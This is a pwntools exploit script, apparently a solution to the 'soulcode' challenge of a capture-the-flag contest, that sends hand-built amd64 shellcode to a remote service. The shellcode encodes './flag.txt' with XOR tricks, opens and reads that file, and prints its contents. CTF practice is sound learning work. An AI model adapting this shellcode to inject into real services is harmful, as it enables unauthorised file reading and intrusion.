from pwn import *
context.arch = "amd64"
#p = process("./soulcode")
p = remote("challs.dantectf.it", 31532)
shellcode = asm("""
    push 0x1010101 ^ 0x7478
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x742e67616c662f2e
    push rax
    xor rdi, rdi
    xor rdi, rsp
    xor edx, edx
    xor esi, esi
    mov rax, 2
    syscall
    xor eax, eax
    mov rax, 0
    mov rdi, 3
    mov rdx, 0x30
    xor rsi, rsi
    xor rsi, rsp
    syscall
    mov rax, 1
    mov rdi, 1
    mov rdx, 0x30
    xor rsi, rsi
    mov rsi, rsp
    syscall
    """)
print(shellcode)
#gdb.attach(p, gdbscript = """
#        b main
#        """)
p.sendline(shellcode)
p.interactive()
